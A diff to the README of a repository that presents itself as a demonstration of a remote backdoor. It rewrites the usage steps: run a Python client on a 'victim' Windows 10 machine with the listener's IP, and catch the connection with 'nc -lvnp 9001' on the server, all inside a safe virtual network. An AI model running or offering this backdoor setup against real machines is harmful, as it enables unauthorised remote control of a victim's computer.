@@ -12,10 +12,16 @@ DISCLAIMER: **This repo is created to demonstrate how a remote backdoor works. H
 Set up a safe virtual network with both a **Windows 10** machine and any other OS able to listen for connections on a specified port
 
 ## Usage
-**First**: change the IP value to the correct IP address of the listener machine at the bottom of ```client/src/client_main/py```
 
-### To test
+### Client (victim)
 
-**Client:** Run ```client/src/client_main/py```
+```bash
+python3 ./client/src/client_main.py <IP of server>
+```
 
-**Server:** Listen on specified port for connections (default set to 9001) using any command like: ```nc -lvnp 9001```
+### Server
+
+Listen on specified port for connections (default set to 9001): 
+```bash
+nc -lvnp 9001
+```
